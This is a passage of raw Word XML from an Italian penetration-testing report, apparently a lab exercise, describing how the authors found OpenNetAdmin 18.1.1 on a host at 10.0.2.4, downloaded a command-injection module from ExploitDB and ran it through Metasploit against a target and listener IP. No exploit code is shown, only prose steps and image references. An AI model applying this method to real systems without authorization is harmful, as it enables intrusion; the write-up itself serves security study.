          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Assessment</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">ed il </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Penetration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F81EFF2" w14:textId="77777777" w:rsidR="002B3E8D" w:rsidRDefault="002B3E8D" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="719BCFB9" w14:textId="43B7412C" w:rsidR="002B3E8D" w:rsidRDefault="002B3E8D" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Sapendo che la versione di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>op</w:t>
      </w:r>
      <w:r w:rsidR="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Net</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Admin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> installata sulla macchina è la 18.1.1, (come mostrato in Figura 19), abbiamo cercato su</w:t>
      </w:r>
      <w:r w:rsidRPr="002B3E8D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002B3E8D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ExploitDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> alcuni exploit associato ad esso. Abbiamo trovato </w:t>
      </w:r>
      <w:r w:rsidR="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">uno script </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ruby</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FD5860" w:rsidRPr="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Metsploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>per l’iniezione di comandi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E8BBA4" w14:textId="77777777" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6013C133" w14:textId="3A83E87A" w:rsidR="00FD5860" w:rsidRPr="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="00FD5860">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251683840" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4360B79D" wp14:editId="2EFC5B54">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>52388</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>311468</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="933132" cy="95250"/>
                <wp:effectExtent l="0" t="0" r="19685" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="752845166" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="933132" cy="95250"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="7D66CE3C" w14:textId="77777777" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="00FD58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0B79D" id="_x0000_s1040" style="position:absolute;left:0;text-align:left;margin-left:4.15pt;margin-top:24.55pt;width:73.45pt;height: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8byUgIAAJwEAAAOAAAAZHJzL2Uyb0RvYy54bWysVN9v2jAQfp+0/8Hy+0igsK2IUDEQ06Sq&#10;RWqnPh+OTSI5tnc2JOyv39mBwro9TXtx7nzn+/Hdd5nddY1mB4m+tqbgw0HOmTTClrXZFfz78/rD&#10;Z858AFOCtkYW/Cg9v5u/fzdr3VSObGV1KZFREOOnrSt4FYKbZpkXlWzAD6yThozKYgOBVNxlJUJL&#10;0RudjfL8Y9ZaLB1aIb2n21Vv5PMUXykpwqNSXgamC061hXRiOrfxzOYzmO4QXFWLUxnwD1U0UBtK&#10;+hpqBQHYHus/QjW1QOutCgNhm8wqVQuZeqBuhvmbbp4qcDL1QuB49wqT/39hxcPhyW2QYGidn3oS&#10;YxedwiZ+qT7WJbCOr2DJLjBBl7c3N8ObEWeCTLeT0SRhmV3eOvThq7QNi0LBkUaREILDvQ+Uj1zP&#10;LjGVseta6zQObVhb8NFknNPEBBArlIZAYuPKgnuz4wz0jugmAqaQ3uq6jM9jII+77VIjO0Acef4l&#10;X58r+80t5l6Br3q/ZIpkoKq0iWFkIs+p1As2UQrdtmM1lTIcxyfxamvL4wYZ2p5g3ol1TQnuwYcN&#10;IDGKOqEtCY90KG2pPXuSOKss/vzbffSnQZOVs5YYSq3/2ANKzvQ3QxS4HY7HkdJJGU8+jUjBa8v2&#10;2mL2zdISIkPaRyeSGP2DPosKbfNCy7SIWckERlDuHuSTsgz95tA6CrlYJDeisYNwb56ciMEjdBHa&#10;5+4F0J1mH4gzD/bMZpi+oUDv25NgsQ9W1YkfF1xpLFGhFUgDOq1r3LFrPXldfirzXwAAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAJ2HBpLcAAAABwEAAA8AAABkcnMvZG93bnJldi54bWxMjs1qwzAQhO+FvoPY&#10;Qm+N7DgJjut1KIVCDynk7wEUa2ObWisjKYnz9lVOzXGY4ZuvXI2mFxdyvrOMkE4SEMS11R03CIf9&#10;11sOwgfFWvWWCeFGHlbV81OpCm2vvKXLLjQiQtgXCqENYSik9HVLRvmJHYhjd7LOqBCja6R26hrh&#10;ppfTJFlIozqOD60a6LOl+nd3NghmXS9d+G6ywybLb+tuH+TJ/CC+vowf7yACjeF/DHf9qA5VdDra&#10;M2sveoQ8i0OE2TIFca/n8ymII8JiloKsSvnoX/0BAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+&#10;AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAA&#10;ACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAA&#10;ACEAGUvG8lICAACcBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYA&#10;CAAAACEAnYcGktwAAAAHAQAADwAAAAAAAAAAAAAAAACsBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAA&#10;AAAEAAQA8wAAALUFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7D66CE3C" w14:textId="77777777" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="00FD5860">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A4B753A" wp14:editId="3861EAD2">
            <wp:extent cx="5274310" cy="1863725"/>
            <wp:effectExtent l="0" t="0" r="2540" b="3175"/>
            <wp:docPr id="1017534009"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4009" name="Immagine 1" descr="Immagine che contiene testo, Carattere, software, numero&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId44"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1863725"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>19</w:t>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>: Pagina web sull’indirizzo 10.0.2.4/ona/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> con la versione di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>openNetAdmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3081E41D" w14:textId="1575AA54" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="459B9923" w14:textId="00BA7366" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Successivamente abbiamo effettuato il download del file dannoso, come riportato nell’immagine seguente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203E9E42" w14:textId="3BA3404E" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="00FD5860">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251685888" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2C20F892" wp14:editId="4CF26244">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>1640941</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>893061</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="738165" cy="135802"/>
                <wp:effectExtent l="0" t="0" r="24130" b="17145"/>
                <wp:wrapNone/>
                <wp:docPr id="240183494" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="738165" cy="135802"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="3BE2262E" w14:textId="77777777" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="00FD58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0F892" id="_x0000_s1041" style="position:absolute;left:0;text-align:left;margin-left:129.2pt;margin-top:70.3pt;width:58.1pt;height:10.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yZBUgIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X22nSZsFdYosQYYB&#10;RVugHXpmZCk2IEsapcTufv0o2W26bqdhF5kUKX48Pvrqum81O0r0jTUlL85yzqQRtmrMvuTfH7ef&#10;5pz5AKYCbY0s+bP0/Hr58cNV5xZyYmurK4mMghi/6FzJ6xDcIsu8qGUL/sw6acioLLYQSMV9ViF0&#10;FL3V2STPL7LOYuXQCuk93W4GI1+m+EpJEe6U8jIwXXKqLaQT07mLZ7a8gsUewdWNGMuAf6iihcZQ&#10;0tdQGwjADtj8EaptBFpvVTgTts2sUo2QqQfqpsjfdfNQg5OpFwLHu1eY/P8LK26PD+4eCYbO+YUn&#10;MXbRK2zjl+pjfQLr+RUs2Qcm6PLyfF5czDgTZCrOZ/N8EsHMTo8d+vBV2pZFoeRIs0gQwfHGh8H1&#10;xSXmMnbbaJ3moQ3rSj6ZTXMamQCihdIQSGxdVXJv9pyB3hPfRMAU0lvdVPF5DORxv1trZEeIM8+/&#10;5Ns0ZqrsN7eYewO+HvySaWxAmxhGJvaMpZ7AiVLodz1rqJRiFp/Eq52tnu+RoR0Y5p3YNpTgBny4&#10;ByRKUSe0JuGODqUttWdHibPa4s+/3Ud/mjRZOeuIotT6jwOg5Ex/M8SBz8V0GjmdlOnsckIKvrXs&#10;3lrMoV1bQqSghXQiidE/6BdRoW2faJtWMSuZwAjKPYA8KuswrA7to5CrVXIjHjsIN+bBiRg8Qheh&#10;feyfAN04+0CkubUvdIbFOwoMvgMJVodgVZP4ccKVeBUV2oHEsHFf45K91ZPX6a+y/AUAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAAjZ+pHgAAAACwEAAA8AAABkcnMvZG93bnJldi54bWxMj8FOwzAQRO9I/IO1&#10;SL1RmySEEOJUqBIShyJB2w9w420SEa+j2G3Tv2c5wW13ZzT7plrNbhBnnELvScPDUoFAarztqdWw&#10;373dFyBCNGTN4Ak1XDHAqr69qUxp/YW+8LyNreAQCqXR0MU4llKGpkNnwtKPSKwd/eRM5HVqpZ3M&#10;hcPdIBOlculMT/yhMyOuO2y+tyenwW2a5ym+t+n+My2um34X5dF9aL24m19fQESc458ZfvEZHWpm&#10;OvgT2SAGDcljkbGVhUzlINiRPmU8HPiSJwpkXcn/HeofAAAA//8DAFBLAQItABQABgAIAAAAIQC2&#10;gziS/gAAAOEBAAATAAAAAAAAAAAAAAAAAAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAG&#10;AAgAAAAhADj9If/WAAAAlAEAAAsAAAAAAAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAG&#10;AAgAAAAhAB/3JkFSAgAAnQQAAA4AAAAAAAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0A&#10;FAAGAAgAAAAhAAjZ+pHgAAAACwEAAA8AAAAAAAAAAAAAAAAArAQAAGRycy9kb3ducmV2LnhtbFBL&#10;BQYAAAAABAAEAPMAAAC5BQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3BE2262E" w14:textId="77777777" w:rsidR="00FD5860" w:rsidRDefault="00FD5860" w:rsidP="00FD5860">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00FD5860">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="59C3754A" wp14:editId="6A1BDF16">
            <wp:extent cx="5274310" cy="1370330"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1270"/>
            <wp:docPr id="545647216"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7216" name="Immagine 1" descr="Immagine che contiene testo, Carattere, numero, linea&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId45"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1370330"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>19</w:t>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: Pagina web </w:t>
      </w:r>
      <w:hyperlink r:id="rId46" w:history="1">
        <w:r w:rsidR="005B6414" w:rsidRPr="00CF4D0E">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:i/>
            <w:iCs/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>https://www.exploit-db.com/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005B6414">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7E43C6" w14:textId="4DC8DB7D" w:rsidR="005B6414" w:rsidRDefault="005B6414" w:rsidP="005B6414">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Inoltre, abbiamo copiato il download </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ruby</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ​​all'interno del framework </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> per utilizzarlo e sfruttare la macchina la vulnerabilità della macchina </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00DC37EC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68371FA0" w14:textId="7C93A6AB" w:rsidR="00DC37EC" w:rsidRDefault="00DC37EC" w:rsidP="00DC37EC">
      <w:r>
        <w:t xml:space="preserve">Dopo aver copiato l'exploit all'interno di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, sarà necessario ricaricare il database e caricare il modulo. Abbiamo avviato </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e siamo andati a:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3199C3" w14:textId="258D871D" w:rsidR="00DC37EC" w:rsidRDefault="00DC37EC">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Selezionare l’exploit da utilizzare</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D153AB8" w14:textId="26A95A73" w:rsidR="00DC37EC" w:rsidRDefault="00DC37EC">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Settare l’indirizzo IP della macchina target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7094B85E" w14:textId="0ADA2DBA" w:rsidR="00DC37EC" w:rsidRDefault="00DC37EC">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Settare l’indirizzo IP della macchina </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>listener</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5F3A0D91" w14:textId="11066858" w:rsidR="00DC37EC" w:rsidRDefault="00DC37EC">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Eseguire l’exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F37D33F" w14:textId="77777777" w:rsidR="00F2226A" w:rsidRPr="00F2226A" w:rsidRDefault="00F2226A" w:rsidP="00F2226A">
      <w:pPr>
        <w:ind w:left="360"/>
